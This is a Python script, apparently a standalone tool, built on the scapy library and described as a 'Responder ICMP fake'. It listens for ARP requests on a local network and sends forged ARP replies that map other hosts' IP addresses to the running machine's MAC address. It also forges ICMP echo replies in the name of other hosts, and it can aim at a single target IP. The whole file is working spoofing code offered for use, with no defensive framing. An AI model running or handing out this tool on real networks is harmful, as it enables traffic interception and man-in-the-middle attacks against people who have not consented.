#!/usr/bin/env python3
import sys
import os
import argparse
import termcolor
from scapy.all import conf, AsyncSniffer, get_if_addr, get_if_hwaddr, Ether, ARP, IP, ICMP, Raw, sniff, sendp, srp1

def sniff_arp(pkts):
    if pkts[ARP].psrc == pkts[ARP].pdst:
        return
    
    if args.check:
        p_alive=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=pkts[ARP].pdst,op=1)
        data=srp1(p_alive, iface=interface, timeout=1, retry=0, verbose=False)
        if data:
            return
    pkt_arp=Ether(dst=pkts[ARP].hwsrc)/ARP(hwdst=pkts[Ether].src,pdst=pkts[ARP].psrc,hwsrc=address_mac,psrc=pkts[ARP].pdst,op=2)
    sendp(pkt_arp, iface=interface, verbose=False)
    print(f'[+] ARP Fake for {pkts[ARP].psrc} ({pkts[ARP].pdst} is-at {address_mac})')
def sniff_icmp(pkts):
    packet=Ether(dst=pkts[Ether].src)/IP(src=pkts[IP].dst,
                                         dst=pkts[IP].src)/ICMP(type='echo-reply',
                                                                id=pkts[ICMP].id,
                                                                seq=pkts[ICMP].seq)/Raw(load=pkts[Raw].load)
    sendp(packet, iface=interface, verbose=False)
    print(f'[+] Send Fake packet ICMP as {pkts[IP].dst} at {pkts[IP].src}')

##MAIN##
interface=None
address_interface=None
address_gateway=None
address_mac=None
src_host_target=''
src_arp_target=''

parser=argparse.ArgumentParser(
                    prog=sys.argv[0],
                    description='Responder ICMP fake')
parser._optionals.title="Options"

parser.add_argument('-i',help='Interface',metavar='INTERFACE',required=True)
parser.add_argument('-t',help='Target ip device(default: listen all ip)',metavar='TARGET',required=False)
parser.add_argument('-c','--check',help='Check first if target alive', default=False, action='store_true', required=False)
args = parser.parse_args()

interface=args.i if args.i in conf.ifaces else None
if not interface:
    print(f'interface "{args.i}" not exist')
    sys.exit(1)

address_mac=get_if_hwaddr(interface)
address_interface=get_if_addr(interface)
address_gateway=conf.route.route('0.0.0.0')[2]

if os.geteuid() != 0:
    print ('Please, run as root')
    sys.exit(1)

if args.t:
    src_host_target=f'and src host {args.t}'
    src_arp_target=f'and arp src {args.t}'

arp=AsyncSniffer(iface=interface, prn=sniff_arp, store=False, filter=(f'ether dst host ff:ff:ff:ff:ff:ff and not ether src host {address_mac} and arp[6:2]=1 {src_arp_target}'))
arp.start()
sniff(iface=interface, prn=sniff_icmp, store=False, filter=(f'not src host {address_interface} and not dst host {address_interface} and icmp[0]=8 {src_host_target}'))